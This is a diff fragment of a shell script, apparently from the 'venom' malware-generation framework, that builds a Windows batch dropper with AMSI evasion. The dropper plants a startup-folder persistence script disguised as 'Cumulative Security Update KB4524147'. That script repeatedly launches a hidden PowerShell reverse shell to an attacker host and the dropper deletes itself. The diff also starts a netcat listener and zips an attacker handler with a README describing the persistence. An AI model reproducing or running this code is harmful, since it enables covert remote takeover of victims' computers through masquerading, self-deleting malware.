-      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
    echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat 
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
@@ -13150,7 +13216,6 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
 xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
-dtr=$(date|awk {'print $2,$3,$4,$5'})
 cd $IPATH
 sleep 2
 
@@ -13166,25 +13231,59 @@ rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 
-## Remark related to 'persistence' function..
+cd $IPATH/output
+## Persistence handler script (zip) creation ..
 if [ "$persistence" = "Add persistence" ]; then
-   ## Write how to delete persistence to output folder ..
-   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH : $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER     : sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "cmd /C echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser" >> $IPATH/output/persistence_ID_$random_name.handler
-   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.vbs\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   else
-      echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/persistence_ID_$random_name.handler
-   fi
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "Settings related to persistence stored under:\n$IPATH/output/persistence_ID_$random_name.handler" --info --width 340 --height 130 > /dev/null 2>&1
+
+   dtr=$(date|awk {'print $2,$3,$4,$5'})
+   cp $IPATH/bin/handlers/handler2.sh $IPATH/output/handler.sh
+   ## Config handler script variable declarations ..
+   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
+   sed -i "s|$two|ID='$Id'|" handler.sh
+   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
+   sed -i "s|$tree|CLIENT='$NaM.ps1'|" handler.sh
+   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
+   sed -i "s|$four|LPORT='$lport'|" handler.sh
+   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
+   sed -i "s|$five|LHOST='$lhost'|" handler.sh
+   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
+   sed -i "s|$seven|RPATH='$rpath\\\\$NaM.ps1'|" handler.sh
+   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
+   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
+   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
+   sed -i "s|$nove|DROPPER='$Drop.$ext.bat'|" handler.sh
+
+
+   ## Write README file (to be compressed)
+   echo "Id          : $Id" > README
+   echo "Description : Reverse Powershell Shell (hex obfuscation)" >> README
+   echo "Categorie   : Amsi Evasion (agent nº3)" >> README
+   echo "Active On   : $dtr" >> README
+   echo "Lhost|Lport : $lhost:$lport" >> README
+   echo "" >> README
+   echo "Instructions" >> README
+   echo "------------" >> README
+   echo "1 - cd output" >> README
+   echo "2 - unzip handler_ID:$Id.zip" >> README
+   echo "3 - sh handler.sh" >> README
+   echo "" >> README
+   echo "Detail Description" >> README
+   echo "------------------" >> README
+   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
+   echo "agent nº3 build. Them the dropper when executed it will create in" >> README
+   echo "remote target startup folder a script named 'KB4524147_$Id.update.bat'" >> README
+   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
+   echo "and creates this handler file (zip) to store attacker handler settings." >> README
+
+   ## zip handler files
+   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
+   zip handler_ID:$Id.zip handler.sh cert.pem key.pem README -m -q
+   cd $IPATH
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
+else
+   ## Delete certs IF persitence was NOT sellected.
+   rm $IPATH/output/cert.pem > /dev/nul 2>&1
+   rm $IPATH/output/key.pem > /dev/nul 2>&1
 fi
 sh_menu
 }
